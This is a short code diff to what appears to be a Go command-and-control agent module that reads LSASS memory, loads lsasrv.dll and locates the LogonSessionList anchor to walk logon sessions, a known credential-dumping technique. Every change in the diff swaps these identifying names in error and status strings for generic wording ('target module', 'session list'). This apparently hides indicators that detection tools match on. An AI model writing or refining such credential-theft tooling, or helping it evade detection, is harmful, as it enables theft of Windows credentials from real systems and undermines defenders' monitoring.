@@ -100,7 +100,7 @@ func executeInsituFullInner() structs.CommandResult {
 
 	lsasrvBytes, err := lsassReadModuleBytes(h, mod)
 	if err != nil {
-		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
+		return errorf("Phase 2B: read target module image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
 	}
 
 	reader := lsassRemoteReader{h: h}
@@ -422,8 +422,8 @@ func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionSt
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
 	sb.WriteString(fmt.Sprintf("[+] LSASS protection: %s\n", protection.Summary()))
-	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
-	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
+	sb.WriteString(fmt.Sprintf("[+] Target pid=%d, module @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
+	sb.WriteString(fmt.Sprintf("[+] Session list anchor: 0x%X\n", anchor))
 	if walkErr != nil {
 		sb.WriteString(fmt.Sprintf("[!] Walk terminated early: %v (collected %d node(s))\n", walkErr, len(nodes)))
 	} else {
@@ -501,7 +501,7 @@ func findValidatedAnchor(lsasrvBytes []byte, lsasrvBase uintptr, reader lsassRea
 		}
 		return candidate, v.Name, nil
 	}
-	return 0, "", fmt.Errorf("LogonSessionList: no variant produced a valid anchor in %d-byte lsasrv.dll (%d variants tried); diagnostics: %s",
+	return 0, "", fmt.Errorf("session list: no variant produced a valid anchor in %d-byte target module (%d variants tried); diagnostics: %s",
 		len(lsasrvBytes), len(logonSessionListVariants), strings.Join(diag, "; "))
 }
 
